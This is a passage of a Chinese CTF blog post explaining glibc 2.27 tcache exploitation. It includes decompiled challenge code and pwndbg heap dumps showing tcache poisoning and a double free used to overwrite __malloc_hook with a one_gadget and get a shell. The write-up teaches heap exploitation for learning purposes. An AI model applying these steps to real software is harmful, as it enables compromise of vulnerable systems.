+<p>我们拿个例题来看看，这是山东省科来杯的一道简单pwn题，由于他给的libc就叫libc-2.27所以我们直接用ubuntu18.04的环境去调试，首先我们先看下题目的基本信息</p>
+<pre><code class="bash">➜  bbtcache file bb_tcache
+bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped
+➜  bbtcache checksec bb_tcache
+[*] &#39;/home/Ep3ius/pwn/process/bbtcache/bb_tcache&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>我们接着反编译分析一下题目</p>
+<pre><code class="c">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  unsigned int i; // [rsp+Ch] [rbp-14h]
+  int choice; // [rsp+10h] [rbp-10h]
+  void *chunk; // [rsp+18h] [rbp-8h]
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  i = 0;
+  puts(&quot;Welcome to easy heap game!&quot;);
+  printf(&quot;I think you might need this: 0x%016llx\n&quot;, &amp;system);
+  while ( i != 7 )
+  {
+    menu(++i);
+    choice = fgets_input();
+    if ( choice == 2 )                          // free
+    {
+      free(chunk);
+    }
+    else if ( choice == 3 )                     // write
+    {
+      puts(&quot;You might need this to tamper something.&quot;);
+      read(0, chunk, 8uLL);
+    }
+    else
+    {
+      if ( choice != 1 )                        // new
+        exit(0);
+      chunk = malloc(0x10uLL);
+    }
+  }
+  puts(&quot;Game over!&quot;);
+  exit(0);
+}
+</code></pre>
+<p>程序逻辑十分清晰，一共七次机会进行new、free、write的操作来getshell，由于除了次数没有任何限制，所以我们能很直接的体会到tcache机制所带来的安全方面问题，我们先做个标准的tcache_poisoning起手式，先放一个堆块到tcache_entry</p>
+<pre><code class="bash">pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x556b70596270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x20)   tcache_entry[0]: 0x556b70596260
+</code></pre>
+<p>接着我们通过write操作去修改一下tcache_next为&amp;malloc_hook</p>
+<pre><code class="bash">pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x556b70596270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x20)   tcache_entry[0]: 0x556b70596260 --&gt; 0x7f2d9da10c10 (&amp;__malloc_hook)
+</code></pre>
+<p>接着new两次把tcache从取出并把malloc_hook修改成one_gadget后new一个新chunk触发malloc_hook就可以getshell了，很简单又直接的题目吧。</p>
+<p>我们回到children_tcache，先做个tcache_dup，也就是对我们之前插在两个unsort_bin中间的chunk进行两次free</p>
+<pre><code class="bash">pwndbg&gt; parseheap
+addr                prev                size                 status              fd                bk
+0x564f27df9000      0x0                 0x250                Used                None              None
+0x564f27df9250      0x0                 0x510                Used                None              None
+0x564f27df9760      0x510               0x30                 Used                None              None
+0x564f27df9790      0xdadadadadadadada  0x4f0                Freed     0x7fa26b599c78    0x7fa26b599c78
+0x564f27df9c80      0x4f0               0x20                 Used                None              None
+pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x556e12172ca0 (size : 0x20360)
+       last_remainder: 0x556e12172790 (size : 0x4f0)
+            unsortbin: 0x556e12172790 (size : 0x4f0)
+(0x30)   tcache_entry[1]: 0x556e12172770
+pwndbg&gt;
+</code></pre>
+<p>接着我们只要free(2)就相当于获得了两个指向0x556e12172770的指针</p>
+<pre><code class="bash">pwndbg&gt; heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x556e12172ca0 (size : 0x20360)
+       last_remainder: 0x556e12172790 (size : 0x4f0)
+            unsortbin: 0x556e12172790 (size : 0x4f0)
+(0x30)   tcache_entry[1]: 0x556e12172770 --&gt; 0x556e12172770 (overlap chunk with 0x556e12172760(freed) )
+</code></pre>
+<p>接着我们就可以new一个新tcache里面存放malloc_hook然后通过tcache_poisoning就可以把malloc_hook修改为one_gadget，再new一个新chunk就可以getshell了。</p>
+<p>在不断的挖掘tcache机制就会遇到更多更有意思的东西，虽然降低安全性但也变得更加有趣了(滑稽)</p>
+<p>感谢M4x师傅，kirin师傅，Hpasserby师傅的知识分享</p>
+<p>相关链接</p>
+<p>调试环境 : <a href="https://github.com/Nepire/nepire-pwn" target="_blank" rel="noopener">nepire-pwn</a>  (将~/nepire-pwn/DOCKER/Dockerfile第一行的16.04 换成17.10或更高即可调试tcache)</p>
+<p>调试器：<a href="https://github.com/Nepire/Pwngdb" target="_blank" rel="noopener">PWNDBG</a></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="null"></li>
+                <li class="wechat-code"><img src="null"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2019/11/05/INSCTF2019笔记/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                INSCTF2019笔记</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2019/11/05/LCTF—easypwn详解/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="" data-src="https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                LCTF—easypwn详解</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz",
+        appKey: "EEpyRysaKmv7aOJjR1o9E4Eq",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="https://nepire.github.io/" class="profile gravatar"><img src="/images/title.ico" itemprop="image" alt="nepire" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://nepire.github.io/" itemprop="url" rel="author">nepire</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>逐梦者</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 nepire<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="/images/title.ico">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">艦隊nepire</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/Nepire" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="https://github.com/Nepire" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="https://github.com/Nepire" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/生活/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/资源/">
+                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                  资源
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/悦读/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  书单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/图集/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/donate/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+            赞赏
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+              <li>
+                <a href="/lab/">
+                  <i class="fa fa-cogs" aria-hidden="true"></i>
+                  Lab
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/client/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+            客户端
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
